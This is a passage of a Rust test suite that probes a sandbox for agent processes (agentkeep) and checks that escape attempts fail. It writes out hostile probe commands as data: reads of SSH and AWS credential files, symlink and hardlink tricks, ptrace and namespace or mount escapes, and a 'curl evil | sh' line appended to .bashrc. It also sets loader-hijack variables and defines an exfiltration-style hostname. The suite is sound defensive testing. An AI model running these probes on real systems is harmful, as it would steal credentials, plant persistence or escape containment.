//! The escape suite: every test tries to do something the threat model says
//! a sandboxed process must not be able to do, and asserts that it fails
//! closed. Tests are named after threat-model ids (`docs/threat-model.md`).
//!
//! Fixtures are benign: fake keys with obvious markers, and no network
//! destination other than host loopback (origins the tests start
//! themselves), TEST-NET addresses that must be unreachable, and
//! `169.254.169.254`, which the proxy must refuse before connecting.
//!
//! On a host where no backend is available every test prints
//! `UNTESTED ON THIS HOST` instead of passing silently. Set
//! `AGENTKEEP_REQUIRE_SANDBOX=1` (as Linux CI does) to turn that into a
//! failure.
//!
//! `AGENTKEEP_ESCAPE_BACKEND=<name>` runs the suite against one backend
//! (`linux`, `container`, `macos`); otherwise the first available one is
//! used. Each test names the controls it exercises, and a backend that does
//! not claim a control (per `agentkeep doctor --json`) gets a
//! `NOT APPLICABLE` line for it instead of a pass. Universal assertions
//! (secrets never leak, the host is never modified) run on every backend.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

/// True when CI demands that the sandbox really runs. An empty value counts
/// as unset so a matrix expression can clear it on other platforms.
fn require_sandbox() -> bool {
    std::env::var("AGENTKEEP_REQUIRE_SANDBOX").is_ok_and(|v| !v.trim().is_empty())
}

#[cfg(unix)]
mod suite {
    use std::collections::BTreeSet;
    use std::fs;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::os::unix::fs::PermissionsExt;
    use std::path::{Path, PathBuf};
    use std::process::{Command, Output};
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::{Arc, Mutex, OnceLock};
    use std::thread;
    use std::time::Duration;

    use super::require_sandbox;

    const FAKE_SSH_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKE_TEST_KEY_NOT_REAL_agentkeep_escape_suite\n-----END OPENSSH PRIVATE KEY-----\n";
    const FAKE_AWS: &str = "[default]\naws_access_key_id = AKIA_TEST_FAKE_NOT_REAL\naws_secret_access_key = FAKE_TEST_SECRET_agentkeep\n";
    const FAKE_ENV_SECRET: &str = "sk-test-fake-agentkeep-escape-suite";

    /// Host-side configuration of the container runtime CLI, passed through
    /// to `agentkeep run` when set.
    const RUNTIME_ENV: &[&str] = &[
        "AGENTKEEP_CONTAINER_RUNTIME",
        "CONTAINERS_CONF",
        "CONTAINER_HOST",
        "DOCKER_HOST",
        "DOCKER_CONFIG",
        "DOCKER_CONTEXT",
        "XDG_RUNTIME_DIR",
        "XDG_DATA_HOME",
    ];

    fn bin() -> &'static str {
        env!("CARGO_BIN_EXE_agentkeep")
    }

    /// A fake home with planted secrets and a project directory.
    pub struct Harness {
        /// Keeps the fixture tree alive; also holds host-only files (CA PEMs, traces).
        pub root: tempfile::TempDir,
        pub home: PathBuf,
        pub project: PathBuf,
        /// Backend under test.
        pub backend: String,
        /// Controls it claims.
        pub controls: Vec<String>,
        /// Pass `--backend` explicitly.
        pub forced: bool,
    }

    impl Harness {
        /// Non-vacuity check for a `strace -f` of the supervisor. On
        /// namespace backends the sandboxed command is a descendant of the
        /// supervisor, so the trace must reach it (`in_sandbox`). The
        /// container backend's command is started by the runtime daemon,
        /// outside the supervisor's process tree; there the trace must at
        /// least reach the runtime's `run`, and the in-container part is
        /// reported as not traced.
        pub fn assert_trace_reached(
            &self,
            id: &str,
            trace: &str,
            in_sandbox: impl Fn(&str) -> bool,
        ) {
            if self.backend == "container" {
                let reached_runtime = trace.lines().any(|l| {
                    l.contains("execve(")
                        && (l.contains("docker") || l.contains("podman"))
                        && l.contains("\"run\"")
                });
                assert!(
                    reached_runtime,
                    "{id}: strace did not reach the runtime's run:\n{trace}"
                );
                let msg = format!(
                    "NOT APPLICABLE [{id} in-sandbox trace] on backend `container`: the command is started by the runtime daemon, not by the supervisor; only the supervisor and runtime CLI were traced"
                );
                println!("{msg}");
                eprintln!("{msg}");
            } else {
                assert!(
                    trace.lines().any(in_sandbox),
                    "{id}: strace did not follow into the sandbox:\n{trace}"
                );
            }
        }

        /// Does the backend under test claim this control?
        pub fn claims(&self, control: &str) -> bool {
            self.controls.iter().any(|c| c == control)
        }

        /// Gate a test on a control. Prints `NOT APPLICABLE` and returns
        /// false when the backend does not claim it.
        pub fn requires(&self, id: &str, control: &str) -> bool {
            if self.claims(control) {
                return true;
            }
            let msg = format!(
                "NOT APPLICABLE [{id}] on backend `{}`: it does not claim `{control}` (see docs/limitations.md)",
                self.backend
            );
            println!("{msg}");
            eprintln!("{msg}");
            false
        }

        fn new(backend: &str, controls: &[String], forced: bool) -> Self {
            let root = tempfile::tempdir().unwrap();
            let home = root.path().join("home");
            let project = root.path().join("home/work/project");
            fs::create_dir_all(home.join(".ssh")).unwrap();
            fs::write(home.join(".ssh/id_ed25519"), FAKE_SSH_KEY).unwrap();
            fs::set_permissions(
                home.join(".ssh/id_ed25519"),
                fs::Permissions::from_mode(0o600),
            )
            .unwrap();
            fs::create_dir_all(home.join(".aws")).unwrap();
            fs::write(home.join(".aws/credentials"), FAKE_AWS).unwrap();
            fs::create_dir_all(home.join("other-project")).unwrap();
            fs::write(
                home.join("other-project/secret.txt"),
                "FAKE_OTHER_PROJECT_SECRET",
            )
            .unwrap();
            fs::write(home.join(".bashrc"), "# original\n").unwrap();
            fs::create_dir_all(&project).unwrap();
            fs::write(project.join("README.md"), "hello\n").unwrap();
            Command::new("git")
                .arg("init")
                .arg("-q")
                .current_dir(&project)
                .output()
                .ok();
            Self {
                root,
                home,
                project,
                backend: backend.to_string(),
                controls: controls.to_vec(),
                forced,
            }
        }

        /// Run a shell snippet inside the sandbox. `extra_policy` is written
        /// to the project's agentkeep.toml (after `schema = 1`).
        pub fn run(&self, extra_policy: &str, script: &str) -> Output {
            self.command(None, extra_policy, &["sh", "-c", script], &[])
                .output()
                .expect("spawn agentkeep")
        }

        /// The `agentkeep run -- <argv>` invocation, optionally wrapped
        /// (`wrapper[0]` is the program, e.g. `strace`), with extra
        /// variables in the supervisor's environment.
        fn command(
            &self,
            wrapper: Option<&[&str]>,
            extra_policy: &str,
            argv: &[&str],
            env: &[(&str, &str)],
        ) -> Command {
            self.command_with(wrapper, extra_policy, argv, env, true)
        }

        /// Run a shell snippet with a project policy the user has NOT
        /// trusted: only its tightening settings may apply (S1).
        pub fn run_untrusted(&self, extra_policy: &str, script: &str) -> Output {
            self.command_with(None, extra_policy, &["sh", "-c", script], &[], false)
                .output()
                .expect("spawn agentkeep")
        }

        /// Write the project policy and, when `trust` is set, trust it the
        /// way a user would after reviewing it.
        /// Set explicitly rather than forwarded: CI runners export their
        /// own, and agentkeep keeps its global policy and trust store there,
        /// so every test needs a private one that `policy trust` and `run`
        /// agree on.
        fn config_home(&self) -> PathBuf {
            self.home.join(".config")
        }

        fn write_policy(&self, extra_policy: &str, trust: bool) {
            let file = self.project.join("agentkeep.toml");
            if extra_policy.is_empty() {
                let _ = fs::remove_file(&file);
                return;
            }
            fs::write(&file, format!("schema = 1\n{extra_policy}")).unwrap();
            if trust {
                let o = Command::new(bin())
                    .args(["policy", "trust"])
                    .arg(&file)
                    .current_dir(&self.project)
                    .env_clear()
                    .env("HOME", &self.home)
                    .env("XDG_CONFIG_HOME", self.config_home())
                    .env("PATH", std::env::var("PATH").unwrap_or_default())
                    .output()
                    .expect("agentkeep policy trust");
                assert!(o.status.success(), "policy trust failed: {}", out(&o));
            }
        }

        fn command_with(
            &self,
            wrapper: Option<&[&str]>,
            extra_policy: &str,
            argv: &[&str],
            env: &[(&str, &str)],
            trust: bool,
        ) -> Command {
            self.write_policy(extra_policy, trust);
            let mut cli = vec!["--no-ask", "run"];
            if self.forced {
                cli.extend(["--backend", self.backend.as_str()]);
            }
            cli.push("--");
            cli.extend(argv);
            let mut cmd = match wrapper {
                Some(w) => {
                    let mut c = Command::new(w[0]);
                    c.args(&w[1..]).arg(bin());
                    c
                }
                None => Command::new(bin()),
            };
            cmd.args(&cli)
                .current_dir(&self.project)
                .env_clear()
                .env("HOME", &self.home)
                .env("XDG_CONFIG_HOME", self.config_home())
                .env("PATH", std::env::var("PATH").unwrap_or_default())
                .env("USER", "escapetester")
                .env("FAKE_SECRET_TOKEN", FAKE_ENV_SECRET)
                .env("LD_PRELOAD", "/nonexistent/evil.so")
                .env("LD_LIBRARY_PATH", "/nonexistent/lib")
                .env("DYLD_INSERT_LIBRARIES", "/nonexistent/evil.dylib")
                .env("PYTHONPATH", "/nonexistent/py")
                .env("NODE_OPTIONS", "--require=/nonexistent/evil.js")
                .env("TERM", "dumb");
            // The container backend's runtime CLI runs on the host side and
            // needs its own configuration (which runtime, where the daemon
            // or rootless storage is). The default env policy scrubs all of
            // these before the sandbox, so they never reach the command.
            for name in RUNTIME_ENV {
                if let Some(v) = std::env::var_os(name) {
                    cmd.env(name, v);
                }
            }
            for (k, v) in env {
                cmd.env(k, v);
            }
            cmd
        }

        fn session_dirs(&self) -> BTreeSet<PathBuf> {
            fs::read_dir(self.home.join(".local/share/agentkeep/sessions"))
                .map(|rd| rd.flatten().map(|e| e.path()).collect())
                .unwrap_or_default()
        }

        /// Run, then load and verify the audit log of exactly that session.
        pub fn run_logged(
            &self,
            wrapper: Option<&[&str]>,
            extra_policy: &str,
            argv: &[&str],
            env: &[(&str, &str)],
        ) -> Logged {
            let before = self.session_dirs();
            let output = self
                .command(wrapper, extra_policy, argv, env)
                .output()
                .expect("spawn agentkeep");
            let new: Vec<PathBuf> = self.session_dirs().difference(&before).cloned().collect();
            assert_eq!(new.len(), 1, "expected one new session:\n{}", out(&output));
            let path = new[0].join("events.jsonl");
            let raw = fs::read_to_string(&path).unwrap();
            let events = agentkeep_audit::verify(&path)
                .unwrap_or_else(|e| panic!("audit chain broken: {e}\n{raw}"));
            Logged {
                output,
                events,
                raw,
            }
        }

        /// Write a file into the project (fixtures the sandbox reads, so
        /// secrets never appear on the logged command line).
        pub fn fixture(&self, name: &str, content: &str) {
            let dir = self.project.join(".fx");
            fs::create_dir_all(&dir).unwrap();
            fs::write(dir.join(name), content).unwrap();
        }
    }

    /// One session's output and verified audit events.
    pub struct Logged {
        pub output: Output,
        pub events: Vec<agentkeep_audit::Event>,
        /// The raw JSONL, to prove a secret is absent from every field.
        pub raw: String,
    }

    impl Logged {
        pub fn text(&self) -> String {
            out(&self.output)
        }

        /// Payloads of every event of `kind`.
        pub fn of(&self, kind: &str) -> Vec<&serde_json::Value> {
            self.events
                .iter()
                .filter(|e| e.kind == kind)
                .map(|e| &e.data)
                .collect()
        }

        /// Events of `kind` whose `port` field is `port`.
        pub fn at(&self, kind: &str, port: u16) -> Vec<&serde_json::Value> {
            self.of(kind)
                .into_iter()
                .filter(|d| d["port"] == port)
                .collect()
        }

        /// The audit log must never contain these strings anywhere.
        pub fn assert_log_free_of(&self, secrets: &[&str]) {
            for s in secrets {
                assert!(
                    !self.raw.contains(s),
                    "secret `{s}` written to the audit log:\n{}",
                    self.raw
                );
            }
        }
    }

    fn out(o: &Output) -> String {
        format!(
            "{}{}",
            String::from_utf8_lossy(&o.stdout),
            String::from_utf8_lossy(&o.stderr)
        )
    }

    /// Backend chosen for this run: name, claimed controls, forced flag.
    type Selection = Result<(String, Vec<String>, bool), String>;

    #[allow(clippy::single_match_else)] // both arms are substantial
    fn select_backend() -> Selection {
        let o = Command::new(bin())
            .args(["doctor", "--json"])
            .output()
            .expect("run agentkeep doctor");
        let report: serde_json::Value = serde_json::from_slice(&o.stdout)
            .map_err(|e| format!("doctor --json unreadable: {e}"))?;
        let wanted = std::env::var("AGENTKEEP_ESCAPE_BACKEND")
            .ok()
            .filter(|v| !v.trim().is_empty());
        let backends = report["backends"].as_array().cloned().unwrap_or_default();
        let pick = backends.iter().find(|b| {
            b["available"] == true
                && wanted
                    .as_deref()
                    .is_none_or(|w| b["name"].as_str() == Some(w))
        });
        match pick {
            Some(b) => {
                let name = b["name"].as_str().unwrap_or_default().to_string();
                let controls = b["controls"]
                    .as_array()
                    .map(|a| {
                        a.iter()
                            .filter_map(|c| c.as_str().map(String::from))
                            .collect()
                    })
                    .unwrap_or_default();
                println!("escape suite: backend `{name}`, controls {controls:?}");
                Ok((name, controls, wanted.is_some()))
            }
            None => {
                let reasons: Vec<String> = backends
                    .iter()
                    .map(|b| format!("{}: {}", b["name"], b["reason"]))
                    .collect();
                Err(match wanted {
                    Some(w) => format!("backend `{w}` unavailable ({})", reasons.join("; ")),
                    None => format!("no sandbox backend available ({})", reasons.join("; ")),
                })
            }
        }
    }

    /// `Some(harness)` when a backend works here, `None` otherwise.
    pub fn harness(id: &str) -> Option<Harness> {
        static SELECTED: OnceLock<Selection> = OnceLock::new();
        match SELECTED.get_or_init(select_backend) {
            Ok((name, controls, forced)) => Some(Harness::new(name, controls, *forced)),
            Err(reason) => {
                let msg = format!("UNTESTED ON THIS HOST [{id}]: {reason}");
                println!("{msg}");
                eprintln!("{msg}");
                assert!(
                    !require_sandbox(),
                    "AGENTKEEP_REQUIRE_SANDBOX is set but the sandbox is unavailable: {reason}"
                );
                None
            }
        }
    }

    /// "No such file", "Operation not permitted" or "Permission denied":
    /// the access failed, whichever way the backend refuses it.
    fn refused(text: &str) -> bool {
        [
            "No such file",
            "Operation not permitted",
            "Permission denied",
        ]
        .iter()
        .any(|m| text.contains(m))
    }

    fn has(tool: &str) -> bool {
        Command::new("sh")
            .args(["-c", &format!("command -v {tool}")])
            .output()
            .is_ok_and(|o| o.status.success())
    }

    /// Assert that a probe failed and leaked nothing.
    fn assert_blocked(o: &Output, forbidden: &[&str], ctx: &str) {
        let text = out(o);
        for f in forbidden {
            assert!(!text.contains(f), "{ctx}: leaked `{f}`:\n{text}");
        }
    }

    // ---- F: filesystem ------------------------------------------------

    #[test]
    fn f1_ssh_and_cloud_credentials_are_absent() {
        let Some(h) = harness("F1") else { return };
        let o = h.run(
            "",
            "cat ~/.ssh/id_ed25519; cat ~/.aws/credentials; ls -la ~/.ssh ~/.aws; echo rc=$?",
        );
        assert_blocked(
            &o,
            &["FAKE_TEST_KEY", "AKIA_TEST_FAKE", "FAKE_TEST_SECRET"],
            "F1",
        );
        assert!(refused(&out(&o)), "{}", out(&o));
        if h.requires("F1 absent", "fs_absent") {
            assert!(out(&o).contains("No such file"), "{}", out(&o));
        }
    }

    #[test]
    fn f1_hidden_paths_under_a_visible_tree_stay_hidden() {
        // A policy makes ~/.config visible; the built-in hidden entries
        // inside it (a directory and a file) must still show nothing. This
        // is the case where the hidden overlay lies over real content.
        let Some(h) = harness("F1 hidden") else {
            return;
        };
        fs::create_dir_all(h.home.join(".config/gh")).unwrap();
        fs::write(
            h.home.join(".config/gh/hosts.yml"),
            "oauth_token: ghp_FAKE_TEST_TOKEN_agentkeep\n",
        )
        .unwrap();
        fs::write(
            h.home.join(".config/hub"),
            "oauth_token: FAKE_HUB_TOKEN_agentkeep\n",
        )
        .unwrap();
        fs::write(h.home.join(".config/visible.txt"), "VISIBLE_CONFIG\n").unwrap();
        let o = h.run(
            "[filesystem]\nread_only = [\"~/.config\"]\n",
            "cat ~/.config/visible.txt; ls -A ~/.config/gh; echo ls-rc=$?; cat ~/.config/gh/hosts.yml; cat ~/.config/hub; echo done",
        );
        let text = out(&o);
        assert_blocked(
            &o,
            &["ghp_FAKE_TEST_TOKEN", "FAKE_HUB_TOKEN", "hosts.yml\n"],
            "F1 hidden",
        );
        assert!(text.contains("VISIBLE_CONFIG"), "{text}");
        assert!(text.contains("done"), "{text}");
        if h.requires("F1 hidden empty", "fs_absent") {
            // The hidden directory exists and is empty.
            assert!(text.contains("ls-rc=0"), "{text}");
        }
    }

    #[test]
    fn f2_other_directories_in_home_are_absent() {
        let Some(h) = harness("F2") else { return };
        let o = h.run("", "cat ~/other-project/secret.txt; ls ~");
        assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "F2");
        let listed = out(&o).lines().any(|l| l.trim() == "other-project");
        assert!(!listed, "other-project listed in home:\n{}", out(&o));
    }

    #[test]
    fn f3_symlink_and_hardlink_tricks_fail() {
        let Some(h) = harness("F3") else { return };
        // Symlink created on the host pointing at the secret.
        std::os::unix::fs::symlink(
            h.home.join(".ssh/id_ed25519"),
            h.project.join("link-to-key"),
        )
        .unwrap();
        let o = h.run(
            "",
            "cat ./link-to-key; ln -s ~/.aws/credentials ./link2 && cat ./link2; ln ~/.ssh/id_ed25519 ./hardlink; echo ln-rc=$?; cat ./hardlink",
        );
        assert_blocked(&o, &["FAKE_TEST_KEY", "AKIA_TEST_FAKE"], "F3");
        if h.requires("F3 hardlink", "hardlink_safe") {
            assert!(
                !h.project.join("hardlink").exists(),
                "hardlink must not be created"
            );
        }
    }

    #[test]
    fn f4_host_processes_are_invisible() {
        let Some(h) = harness("F4") else { return };
        if !h.requires("F4", "pid_isolation") {
            return;
        }
        let supervisor_pid = std::process::id();
        let o = h.run("", &format!("ls /proc | grep -c '^[0-9]'; test -d /proc/{supervisor_pid} && echo HOST_PID_VISIBLE; cat /proc/1/cmdline | tr '\\0' ' '; ls /proc/1/root/ 2>&1 | head -3"));
        let text = out(&o);
        assert!(!text.contains("HOST_PID_VISIBLE"), "{text}");
        let count: usize = text
            .lines()
            .next()
            .and_then(|l| l.trim().parse().ok())
            .unwrap_or(999);
        assert!(count < 10, "too many pids visible ({count}):\n{text}");
        assert!(
            text.contains("agentkeep"),
            "pid 1 should be agentkeep's init:\n{text}"
        );
    }

    #[test]
    fn f5_ptrace_and_process_memory_access_are_denied() {
        let Some(h) = harness("F5") else { return };
        if !h.requires("F5", "ptrace_denied") {
            return;
        }
        if !has("python3") {
            println!("UNTESTED [F5]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "",
            r#"python3 -c '
import ctypes, os
libc = ctypes.CDLL(None, use_errno=True)
r = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
print("ptrace", r, os.strerror(ctypes.get_errno()))
r = libc.syscall(310, 1, None, 0, None, 0, 0)  # process_vm_readv on x86_64; harmless args
print("pvr", r, os.strerror(ctypes.get_errno()))
'"#,
        );
        let text = out(&o);
        assert!(text.contains("ptrace -1 Operation not permitted"), "{text}");
    }

    #[test]
    fn f6_mount_and_namespace_escapes_are_denied() {
        let Some(h) = harness("F6") else { return };
        if !h.requires("F6", "no_mount") {
            return;
        }
        let o = h.run(
            "",
            "unshare -Ur true; echo unshare-rc=$?; unshare -m true; echo unshare-m-rc=$?; /bin/mount -t tmpfs none /mnt 2>&1; echo mount-rc=$?; mkdir -p /tmp/newroot && (cd /tmp/newroot && /sbin/pivot_root . . 2>&1); echo pivot-rc=$?",
        );
        let text = out(&o);
        assert!(
            text.contains("unshare-rc=1") || text.contains("Operation not permitted"),
            "{text}"
        );
        assert!(!text.contains("mount-rc=0"), "{text}");
        assert!(!text.contains("pivot-rc=0"), "{text}");
    }

    #[test]
    fn f7_shell_rc_writes_do_not_reach_the_host() {
        let Some(h) = harness("F7") else { return };
        let o = h.run(
            "",
            "echo 'curl evil | sh' >> ~/.bashrc; echo 'x' > ~/.profile; echo rc=$?",
        );
        assert!(o.status.success(), "{}", out(&o));
        assert_eq!(
            fs::read_to_string(h.home.join(".bashrc")).unwrap(),
            "# original\n",
            "host .bashrc changed"
        );
        assert!(!h.home.join(".profile").exists(), "host .profile created");
    }

    #[test]
    fn f8_project_persistence_writes_are_allowed_and_will_be_reported() {
        // Documented as detect-only: the sandbox must allow writes into the
        // project, including .git/hooks. This test pins the behaviour so a
        // future change to blocking is deliberate.
        let Some(h) = harness("F8") else { return };
        let o = h.run(
            "",
            "mkdir -p .git/hooks && echo '#!/bin/sh' > .git/hooks/pre-commit && echo wrote",
        );
        assert!(out(&o).contains("wrote"), "{}", out(&o));
        assert!(h.project.join(".git/hooks/pre-commit").exists());
    }

    #[test]
    fn f10_audit_log_and_global_policy_are_invisible() {
        let Some(h) = harness("F10") else { return };
        let o = h.run("", "ls ~/.local/share/agentkeep/sessions 2>&1; ls ~/.config/agentkeep 2>&1; cat /proc/mounts 2>/dev/null | grep -c sessions");
        let text = out(&o);
        assert!(refused(&text), "{text}");
        assert!(!text.contains("events.jsonl"), "{text}");
        if h.requires("F10 mounts", "fs_absent") {
            assert!(
                text.lines().any(|l| l.trim() == "0"),
                "a session mount leaked:\n{text}"
            );
        }
        // ...while the log exists on the host.
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        assert!(sessions.exists());
    }

    // ---- E: environment -----------------------------------------------

    #[test]
    fn e1_secret_environment_variables_are_scrubbed() {
        let Some(h) = harness("E1") else { return };
        let o = h.run(
            "",
            "env; cat /proc/1/environ | tr '\\0' '\\n'; cat /proc/self/environ | tr '\\0' '\\n'",
        );
        assert_blocked(&o, &[FAKE_ENV_SECRET, "FAKE_SECRET_TOKEN"], "E1");
        assert!(
            out(&o).contains("HOME="),
            "allowed variables must pass through"
        );
    }

    #[test]
    fn e2_loader_hijack_variables_are_scrubbed() {
        let Some(h) = harness("E2") else { return };
        let o = h.run(
            "",
            "env | grep -E '^(LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]*|PYTHONPATH|NODE_OPTIONS)=' ; echo grep-rc=$?",
        );
        assert!(out(&o).contains("grep-rc=1"), "{}", out(&o));
    }

    // ---- N: network ---------------------------------------------------

    #[test]
    fn n3_n4_no_network_and_no_dns() {
        let Some(h) = harness("N3/N4") else { return };
        if !h.requires("N3/N4", "net_isolation") {
            return;
        }
        if h.requires("N3/N4 netns", "net_namespace") {
            let o = h.run(
                "",
                "getent hosts example.com; echo dns-rc=$?; cat /proc/net/dev | tail -n +3 | awk '{print $1}'; cat /proc/net/route | wc -l",
            );
            let text = out(&o);
            assert!(text.contains("dns-rc=2"), "{text}");
            let ifaces: Vec<&str> = text.lines().filter(|l| l.ends_with(':')).collect();
            assert_eq!(ifaces, vec!["lo:"], "only loopback may exist:\n{text}");
        }
        if has("python3") {
            let o = h.run("", "python3 -c 'import socket; s=socket.socket(); s.settimeout(2); s.connect((\"127.0.0.1\", 9)) if False else None; \ntry:\n s.connect((\"203.0.113.1\", 80)); print(\"CONNECTED\")\nexcept OSError as e: print(\"blocked\", e)'");
            assert!(!out(&o).contains("CONNECTED"), "{}", out(&o));
        }
    }

    // ---- N: network through the egress proxy ------------------------
    //
    // Every origin below is started by the test on host 127.0.0.1 and
    // records each byte it receives, so a test can prove that a blocked
    // secret never arrived. Inside the sandbox `NO_PROXY` lists loopback
    // (for the agent's own local servers), so requests to these host-side
    // origins name the in-sandbox relay explicitly. Secrets reach the
    // sandbox as fixture files, never on the command line, because the
    // command line is logged.

    /// Fake credentials in the formats the DLP detectors know.
    const FAKE_GH_TOKEN: &str = "ghp_TESTFAKEagentkeepEscapeSuite00000000";
    const FAKE_AWS_KEY: &str = "AKIATESTFAKE00000000";
    const FAKE_PROVIDER_KEY: &str = "sk-ant-test-fake-agentkeep-escape-0000";
    /// An exfiltration-shaped name under a reserved TLD.
    const EXFIL_NAME: &str = "akiatestfake00000000.exfil.test";

    /// Shell prelude: `px` sends a request through the relay explicitly and
    /// ends the output with a newline so `-w` tags start a line.
    const PX: &str =
        "px() { curl -sS -m 10 --noproxy '' -x http://127.0.0.1:3128 \"$@\"; echo; }\n";

    /// A local origin that records what it receives. Plain HTTP/1.1 or TLS
    /// (self-signed for `localhost`); answers `origin-ok <request line>`,
    /// or `101` and an echo for a WebSocket upgrade.
    pub struct Origin {
        pub port: u16,
        seen: Arc<Mutex<Vec<u8>>>,
        conns: Arc<AtomicUsize>,
    }

    impl Origin {
        pub fn plain() -> Self {
            Self::start(None)
        }

        /// Returns the origin and its certificate, PEM encoded.
        pub fn tls() -> (Self, String) {
            let key = rcgen::KeyPair::generate().unwrap();
            let cert = rcgen::CertificateParams::new(vec!["localhost".to_string()])
                .unwrap()
                .self_signed(&key)
                .unwrap();
            let key_der = rustls_pki_types::PrivateKeyDer::Pkcs8(
                rustls_pki_types::PrivatePkcs8KeyDer::from(key.serialize_der()),
            );
            let cfg = rustls::ServerConfig::builder_with_provider(Arc::new(
                rustls::crypto::ring::default_provider(),
            ))
            .with_safe_default_protocol_versions()
            .unwrap()
            .with_no_client_auth()
            .with_single_cert(vec![cert.der().clone()], key_der)
            .unwrap();
            (Self::start(Some(Arc::new(cfg))), cert.pem())
        }

        fn start(tls: Option<Arc<rustls::ServerConfig>>) -> Self {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let port = listener.local_addr().unwrap().port();
            let seen = Arc::new(Mutex::new(Vec::new()));
            let conns = Arc::new(AtomicUsize::new(0));
            let (record, count) = (Arc::clone(&seen), Arc::clone(&conns));
            thread::spawn(move || {
                for stream in listener.incoming().flatten() {
                    count.fetch_add(1, Ordering::SeqCst);
                    let seen = Arc::clone(&record);
                    let tls = tls.clone();
                    thread::spawn(move || {
                        let _ = stream.set_read_timeout(Some(Duration::from_secs(20)));
                        match tls {
                            Some(cfg) => {
                                let conn = rustls::ServerConnection::new(cfg).unwrap();
                                let inner = rustls::StreamOwned::new(conn, stream);
                                serve_origin(Recorder { inner, seen });
                            }
                            None => serve_origin(Recorder {
                                inner: stream,
                                seen,
                            }),
                        }
                    });
                }
            });
            Self { port, seen, conns }
        }

        /// Everything received so far (plaintext, after TLS).
        pub fn received(&self) -> String {
            String::from_utf8_lossy(&self.seen.lock().unwrap()).into_owned()
        }

        /// TCP connections accepted so far.
        pub fn connections(&self) -> usize {
            self.conns.load(Ordering::SeqCst)
        }
    }

    struct Recorder<S> {
        inner: S,
        seen: Arc<Mutex<Vec<u8>>>,
    }

    impl<S: Read> Read for Recorder<S> {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            let n = self.inner.read(buf)?;
            self.seen.lock().unwrap().extend_from_slice(&buf[..n]);
            Ok(n)
        }
    }

    impl<S: Write> Write for Recorder<S> {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            self.inner.write(buf)
        }
        fn flush(&mut self) -> std::io::Result<()> {
            self.inner.flush()
        }
    }

    fn serve_origin<S: Read + Write>(mut s: S) {
        let mut buf = Vec::new();
        let mut tmp = [0u8; 8192];
        let end = loop {
            if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                break i + 4;
            }
            match s.read(&mut tmp) {
                Ok(0) | Err(_) => return,
                Ok(n) => buf.extend_from_slice(&tmp[..n]),
            }
        };
        let head = String::from_utf8_lossy(&buf[..end]).to_string();
        let lower = head.to_ascii_lowercase();
        let line = head.lines().next().unwrap_or_default().to_string();
        if lower.contains("\r\nupgrade: websocket") {
            let _ = s.write_all(
                b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            );
            let _ = s.flush();
            let mut pending = buf[end..].to_vec();
            loop {
                if !pending.is_empty() {
                    if s.write_all(&pending).is_err() {
                        return;
                    }
                    let _ = s.flush();
                    pending.clear();
                }
                match s.read(&mut tmp) {
                    Ok(0) | Err(_) => return,
                    Ok(n) => pending.extend_from_slice(&tmp[..n]),
                }
            }
        }
        let len: usize = lower
            .lines()
            .find_map(|l| l.strip_prefix("content-length:"))
            .and_then(|v| v.trim().parse().ok())
            .unwrap_or(0);
        while buf.len() < end + len {
            match s.read(&mut tmp) {
                Ok(0) | Err(_) => return,
                Ok(n) => buf.extend_from_slice(&tmp[..n]),
            }
        }
        let body = format!("origin-ok {line}\n");
        let _ = write!(
            s,
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = s.flush();
    }

    /// Gate on host tools the probes need. A missing tool is UNTESTED,
    /// which fails under `AGENTKEEP_REQUIRE_SANDBOX`.
    fn tools(id: &str, needed: &[&str]) -> bool {
        for t in needed {
            if !has(t) {
                let msg = format!("UNTESTED [{id}]: `{t}` missing on this host");
                println!("{msg}");
                eprintln!("{msg}");
                assert!(!require_sandbox(), "{msg}");
                return false;
            }
        }
        true
    }

    /// `strace` arguments that log `calls` for the whole process tree.
    fn strace(trace: &Path, calls: &str) -> Vec<String> {
        vec![
            "strace".into(),
            "-f".into(),
            "-qq".into(),
            "-e".into(),
            format!("trace={calls}"),
            "-e".into(),
            "signal=none".into(),
            "-o".into(),
            trace.display().to_string(),
        ]
    }

    /// Lines of an strace log that reach for anything but a Unix socket or
    /// one of the `allowed` loopback endpoints, or consult a name service.
    ///
    /// With `absent_resolver_ok`, a name-service socket that does not exist
    /// does not count: the container backend's trace includes the runtime
    /// CLI, and rootless Podman (linked against glibc) looks up the user
    /// database through NSS, which tries nscd first. Such a connect reaches
    /// nothing, and a lookup that then falls back to DNS is still caught as
    /// an inet attempt.
    fn outbound_attempts(trace: &str, allowed: &[&str], absent_resolver_ok: bool) -> Vec<String> {
        trace
            .lines()
            .filter(|l| {
                if l.contains("io.systemd.Resolve") || l.contains("nscd/socket") {
                    return !(absent_resolver_ok
                        && l.ends_with("= -1 ENOENT (No such file or directory)"));
                }
                let inet = l.contains("sa_family=AF_INET") || l.contains("sa_family=AF_UNSPEC");
                if l.contains("connect(") {
                    !l.contains("sa_family=AF_UNIX") && !allowed.iter().any(|a| l.contains(a))
                } else if l.contains("sendto(") || l.contains("sendmsg(") {
                    inet
                } else {
                    false
                }
            })
            .map(String::from)
            .collect()
    }

    /// The in-sandbox side of the relay as strace prints it.
    const RELAY_CONNECT: &str = "sin_port=htons(3128), sin_addr=inet_addr(\"127.0.0.1\")";

    /// Assert a DLP block was logged with a redacted sample.
    fn assert_redacted(block: &serde_json::Value, secret: &str) {
        let sample = block["sample"].as_str().unwrap_or_default();
        assert!(
            sample.starts_with(&secret[..4]),
            "sample should keep the first four characters: {block}"
        );
        assert!(
            !sample.contains(&secret[4..12]),
            "sample leaks the secret: {block}"
        );
    }

    #[test]
    fn positive_control_allowed_host_works_through_the_proxy() {
        let Some(h) = harness("N1 control") else {
            return;
        };
